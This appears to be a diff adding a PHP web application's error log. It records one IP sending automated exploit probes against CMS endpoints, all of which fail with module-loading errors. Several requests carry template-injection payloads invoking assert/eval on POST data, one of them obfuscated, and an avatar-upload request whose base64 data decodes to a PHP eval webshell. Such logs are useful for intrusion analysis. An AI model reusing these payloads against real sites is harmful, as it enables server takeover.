@@ -1,0 +1,36 @@
+[ 2019-04-25T15:30:57+08:00 ] 14.204.122.89 //index.php?m=member&c=index&a=register&siteid=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000495s ]
+ERR: 无法加载模块:Member
+
+[ 2019-04-25T15:30:58+08:00 ] 14.204.122.89 //index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000343s ]
+ERR: 无法加载模块:Vod-search
+
+[ 2019-04-25T15:30:58+08:00 ] 14.204.122.89 //index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000255s ]
+ERR: 无法加载模块:Vod-search
+
+[ 2019-04-25T15:30:59+08:00 ] 14.204.122.89 //index.php?m=vod-search&wd={{page:lang}if-A:e{page:lang}val{page:lang}($_PO{page:lang}ST[hxg])}{endif-A}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000340s ]
+ERR: 无法加载模块:Vod-search
+
+[ 2019-04-25T15:31:02+08:00 ] 14.204.122.89 //index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,aGVsZW48P3BocCBAZXZhbCgkX1BPU1RbaGVsZW5zYl0pOz8+
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000284s ]
+ERR: 无法加载模块:Data2
+
+[ 2019-04-25T15:31:02+08:00 ] 14.204.122.89 //index.php?s=member&c=register&m=index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000327s ]
+ERR: 无法加载模块:Index
+
